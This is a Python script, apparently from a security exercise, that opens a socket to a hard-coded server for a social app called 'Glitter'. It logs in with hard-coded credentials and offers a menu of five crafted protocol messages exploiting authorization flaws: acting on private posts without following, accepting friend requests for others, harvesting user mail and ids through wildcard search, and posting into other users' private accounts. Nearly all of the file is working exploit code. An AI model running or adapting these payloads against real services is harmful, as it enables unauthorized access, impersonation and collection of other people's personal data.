import socket
import datetime
IP_ADDR = "54.187.16.171"
PORT = 1336
SIZE = 10000
ONE = 1
FIRST_HOUR_INDEX = 11
LAST_HOUR_INDEX = 13
THREE = 3
TEN = 10
PLACE_TO_ADD_Z = 23

LIST_FOR_USER_MSGS = ['100#{gli&&er}{"user_name":"user1","password":"username","enable_push_notifications":true}##',
                      '110#{gli&&er}1795##', '440#{gli&&er}38##']

DICT_FOR_ALL_OPTIONS = {'1': '710#{gli&&er}{"glit_id":404,"user_id":38,"user_screen_name":"user1","id":-1}##',
                        '2': '420#{gli&&er}[38,516]##',
                        '3': '300#{gli&&er}{"search_type":"WILDCARD","search_entry":"sh"}##',
                        '4': '650#{gli&&er}{"glit_id":404,"user_id":38,"user_screen_name":"user1","id":-1,"content":"checkingGlitFake","date":"%s"}##',
                        '5': '550#{gli&&er}{"feed_owner_id":516,"publisher_id":38,"publisher_screen_name":"user1","publisher_avatar":"im1","background_color":"White","date":"%s","content":"check","font_color":"black","id":-1}##'}

MENU_OPTIONS = """
WELCOME! here are some of the weak points that i found, to check one choose between 1-5!
1 - like to user that you don't follow after
2 - except glitt friend request that u send to another private user
3 - receive data (like mail and id) about a user you would like to receive data about using search 
4 - comment on someones private glitt that you don't follow after
5 - create glitt in another private person account
"""


def conncet_to_glitter():
    """
    this function will communicate with the server using the client choice and print all the server's response
    for the client messages
    :return: none
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = (IP_ADDR, PORT)
    sock.connect(server_address)
    users_choice = menu()
    try:
        for msg in LIST_FOR_USER_MSGS:
            sock.sendall(msg.encode())
            print("client send - ", msg)
            server_msg = sock.recv(SIZE)
            server_msg = server_msg.decode()
            print("server response - ", server_msg)
        if users_choice == "4" or users_choice == "5":
            date = receive_current_date()
            msg = DICT_FOR_ALL_OPTIONS[users_choice] % (date)
        else:
            msg = DICT_FOR_ALL_OPTIONS[users_choice]
        sock.sendall(msg.encode())
        print("client send - ", msg)
        server_msg = sock.recv(SIZE)
        server_msg = server_msg.decode()
        print("server response - ", server_msg)
    except Exception as e:
        print("Error!: ", e)
        exit(ONE)
    sock.close()


def receive_current_date():
    """
    receive the current date subtract 3 from the hour and return it
    :return: date - the current date subtract 3 from the hour
    :rtype: str
    """
    date = str(datetime.datetime.now())
    date = (date[:PLACE_TO_ADD_Z] + 'Z').replace(" ", "T")
    if (int(date[FIRST_HOUR_INDEX:LAST_HOUR_INDEX]) - THREE) < TEN:
        return date[:FIRST_HOUR_INDEX] + '0' + str(int(date[FIRST_HOUR_INDEX:LAST_HOUR_INDEX]) - THREE) + date[LAST_HOUR_INDEX:]
    else:
        return date[:FIRST_HOUR_INDEX] + str(int(date[FIRST_HOUR_INDEX:LAST_HOUR_INDEX]) - THREE) + date[LAST_HOUR_INDEX:]


def menu():
    """
    print the menu and receives the user's choice, return user's choice
    :return: user's choice - the choice the user made between 1 - 5
    :rtype: str
    """
    print(MENU_OPTIONS)
    users_choice = input("choose between 1 - 5! ")
    while "1" > users_choice or "5" < users_choice:
        print(MENU_OPTIONS)
        users_choice = input("choose between 1 - 5! ")
    return users_choice


def main():
    conncet_to_glitter()


if __name__ == '__main__':
    main()